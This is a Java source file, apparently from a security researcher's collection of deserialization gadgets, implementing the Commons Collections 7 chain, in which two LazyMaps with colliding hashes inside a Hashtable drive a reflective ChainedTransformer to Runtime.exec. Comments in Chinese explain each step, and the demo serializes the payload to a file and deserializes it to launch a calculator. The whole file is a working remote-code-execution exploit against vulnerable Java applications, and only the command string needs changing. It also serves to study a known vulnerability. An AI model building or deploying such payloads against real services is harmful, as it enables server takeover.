package com.sec.exploits.CommonsCollections.CommonsCollections7;

import com.sec.annotation.Dependencies;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

/**
 * @program: Gadgets
 * @description:
 * @author: 0range
 * @create: 2021-05-17 14:08
 **/

/**
 * Gadgets chain :
 *          ObjectInputStream.readObject()
 *            Hashtable.readObject()
 *              Hashtable.reconstitutionPut()
 *                 AbstractMapDecorator.equals()
 *                      AbstractMap.equals()
 *                          LazyMap.get()
 *                               ChainedTransformer.transform()
 *                                   ConstantTransformer.transform()
 *                                   InvokerTransformer.transform()
 *                                       Method.invoke()
 *                                           Class.getMethod()
 *                                   InvokerTransformer.transform()
 *                                       Method.invoke()
 *                                           Runtime.getRuntime()
 *                                   InvokerTransformer.transform()
 *                                       Method.invoke()
 *                                           Runtime.exec()
 *
 *
 */


@Dependencies({
        "commons-collections:commons-collections:3.1-3.2.1",
        "jdk1.7 & 1.8"
})
public class Hashtable_Exploit {
    public static void main(String[] args) throws Exception{

        Transformer[] fakeTransformer = new Transformer[]{};


        Transformer[] transformers_exec = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class, Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"open /Applications/Calculator.app"})
        };

        //先用一个假的chain占位置，稍后反射改回来
        //这里还是为了能够避开lazymap.put提前RCE
        Transformer fakeChain = new ChainedTransformer(fakeTransformer);

        //LazyMap实例
        Map innerMap1 = new HashMap();
        Map innerMap2 = new HashMap();

        //创建两个lazymap实例
        Map lazyMap1 = LazyMap.decorate(innerMap1,fakeChain);
        lazyMap1.put("yy", 1);
        Map lazyMap2 = LazyMap.decorate(innerMap2,fakeChain);
        lazyMap2.put("zZ", 1);

        Hashtable hashTable = new Hashtable();
        hashTable.put(lazyMap1, "0range");
        hashTable.put(lazyMap2, "0range");


        //通过反射设置真的 chain 数组
        Field field = ChainedTransformer.class.getDeclaredField("iTransformers");
        field.setAccessible(true);
        field.set(fakeChain, transformers_exec);

        lazyMap2.remove("yy");

        //payload序列化写入文件，模拟网络传输
        ObjectOutputStream fout = new ObjectOutputStream(new FileOutputStream(new File(System.getProperty("user.dir")+"/src/main/resources/Payload_cc7_TemplatesImpl_HashTable.ser")));
        fout.writeObject(hashTable);

        //服务端读取文件，反序列化，模拟网络传输
        ObjectInputStream fin = new ObjectInputStream(new FileInputStream(new File(System.getProperty("user.dir")+"/src/main/resources/Payload_cc7_TemplatesImpl_HashTable.ser")));
        //服务端反序列化，触发漏洞
        fin.readObject();

    }
}
